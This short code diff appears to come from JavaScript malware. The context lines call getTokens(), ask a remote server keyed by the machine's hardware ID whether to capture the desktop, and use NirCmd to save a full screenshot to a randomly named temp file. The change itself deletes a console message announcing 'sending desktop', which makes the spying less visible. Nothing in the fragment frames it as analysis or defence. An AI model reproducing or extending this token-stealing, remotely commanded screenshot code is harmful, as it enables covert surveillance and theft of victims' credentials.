@@ -120,7 +120,6 @@ getTokens().then((tokens) => {
             checkForNirCmd().then((nirCmdDir) => {
                 get(url.toLowerCase() + `/ss/${hwid}`).then((doSendSS) => {
                     if (doSendSS == 'true') {
-                        console.log('!! sending desktop');
                         const ssFileName = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + '.tmp';
 
                         exec(`${nirCmdDir} savescreenshotfull %temp%\\${ssFileName}`, {}, (err, stdout, stderr) => {
